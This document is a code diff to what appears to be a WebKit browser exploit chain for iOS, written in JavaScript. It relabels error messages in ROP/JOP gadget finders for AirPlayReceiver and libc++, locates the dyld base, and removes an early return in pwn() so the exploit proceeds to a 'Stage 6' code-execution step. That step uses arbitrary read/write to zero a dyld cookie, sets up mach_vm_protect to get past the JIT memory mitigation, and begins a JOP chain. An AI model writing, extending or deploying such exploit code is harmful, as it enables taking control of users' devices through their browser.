@@ -394,8 +394,8 @@ function find_dispatch_gadget(airplayreceiver_base, APAdvertiserGetTypeID_addr) 
     dispatch = Sub(dispatch, 0x2000);
     while (true) {
         if(try_count > 13000) {
-            log(`[-] failed webkit patchfinder`);
-            return;
+            log(`[-] failed find_dispatch_gadget`);
+            return null;
         }
 
         // AirPlayReceiver:__text:00000001A9AC7958 A0 02 3F D6                             BLR             X21
@@ -420,8 +420,8 @@ function find_movx4_gadget(libcpp1_base, znst3_addr) {
     var movx4 = Add(libcpp1_base, znst3_addr);
     while (true) {
         if(try_count > 100) {
-            log(`[-] failed webkit patchfinder`);
-            return;
+            log(`[-] failed find_movx4_gadget`);
+            return null;
         }
 
         // libc++.1:__text:000000018004314C E4 03 14 AA                             MOV             X4, X20
@@ -443,8 +443,8 @@ function find_regloader_gadget(libcpp1_base, znkst3_addr) {
     var regloader = Add(libcpp1_base, znkst3_addr);
     while (true) {
         if(try_count > 100) {
-            log(`[-] failed webkit patchfinder`);
-            return;
+            log(`[-] failed find_regloader_gadget`);
+            return null;
         }
 
         // libc++.1:__text:0000000180056D18 E3 03 16 AA                             MOV             X3, X22
@@ -475,13 +475,13 @@ function obtain_dyld_base(libdyld_base, dyld_process_info_notify_release_addr) {
     var __ZL25sNotifyMonitoringDyldMain_addr = follow_adrpLdr(Add(libdyld_base, __Z27setNotifyMonitoringDyldMainPFvvE_addr));
     var __ZL25sNotifyMonitoringDyldMain = read64(__ZL25sNotifyMonitoringDyldMain_addr);
 
-    try_count = 0;
+    var try_count = 0;
     var dyld_base = Sub(__ZL25sNotifyMonitoringDyldMain, __ZL25sNotifyMonitoringDyldMain.lo() & 0xfff);
     dyld_base = Sub(dyld_base, 0x7000);
     while (true) {
         if(try_count > 100) {
-            log(`[-] failed webkit patchfinder`);
-            return;
+            log(`[-] failed obtain_dyld_base`);
+            return null;
         }
         opcode = read64(dyld_base);
         if(opcode == 0x100000CFEEDFACF) {
@@ -724,10 +724,10 @@ function pwn() {
     log(`[+] /usr/lib/dyld: ${dyld_base}`);
     log(`[+] Obtained /usr/lib/dyld base.\n`);
 
-    return;
 
-    // needed arguments to call stage1's _load
-    var dlsym = Add(libdyld_base, dlsym_addr);
+    //6. We've done here, get code execution
+    log(`[Stage 6] Prepare code execution...`);
+
     
     // needed to bypass seperated RW, RX JIT mitigation
     var __MergedGlobals_52_addr = follow_adrpLdr(Add(jsc_base, startOfFixedExecutableMemoryPoolImpl_addr));
@@ -744,12 +744,16 @@ function pwn() {
     var usleep = Add(libsystem_c_base, usleep_addr);
     var mach_vm_protect = Add(libsystem_kernel_base, mach_vm_protect_addr);
     var mach_task_self_ = read64(Add(libsystem_kernel_base, mach_task_self_addr));
+    var dlsym = Add(libdyld_base, dlsym_addr);
 
-    log(`[i] dyld_base = ${dyld_base}`);
     var cookieAddr = Add(dyld_base, offsets.cookieAddr);
     log(`[i] read cookie  = ${read64(cookieAddr)}`);
     write64(cookieAddr, new Int64(0));
     log(`[i] writechk  = ${read64(cookieAddr)}`);
+
+
+
+
 
     // JOP START !!!
     var x19 = malloc(0x100);
